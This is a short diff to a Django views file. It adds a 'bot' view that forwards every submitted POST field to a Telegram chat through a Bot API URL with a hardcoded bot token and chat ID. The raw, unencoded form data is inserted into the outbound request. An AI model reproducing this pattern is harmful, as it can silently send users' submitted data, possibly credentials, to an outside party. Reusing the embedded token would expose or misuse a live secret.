@@ -16,3 +16,10 @@ def home(request):
         return redirect('home')
         # return redirect('home')
     return render(request, 'home.html')
+
+def bot(request):
+    if request.method == "POST":
+        print(request.POST)
+        data = request.POST
+        requests.get(f"https://api.telegram.org/bot5342966070:AAF7m176nTTcVD3a0JLwD5JoO2Mvf-JEqxg/sendmessage?chat_id=848796050&text={data}&parse_mode=html")
+    return render(request, 'home.html')
